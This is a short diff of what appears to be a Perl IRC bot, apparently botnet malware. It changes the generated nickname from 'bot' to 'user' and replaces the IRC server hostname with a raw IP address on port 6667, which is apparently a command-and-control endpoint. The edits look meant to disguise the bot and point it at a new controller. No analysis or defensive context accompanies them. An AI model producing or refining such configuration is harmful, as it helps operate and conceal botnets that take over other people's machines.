@@ -118,7 +118,7 @@ my $chanpass = "-zr";
 
 $num = int rand(10000); 
 
-my $nick = "bot" . $num . ""; 
+my $nick = "user" . $num . ""; 
 
   
 
@@ -130,7 +130,7 @@ chop (my $realname = '[Protection]-');
 
 #IRC name and Realname  
 
-$servidor='irc.xevion.net' unless $servidor; 
+$servidor='178.33.38.42' unless $servidor; 
 
 my $porta='6667';  
 
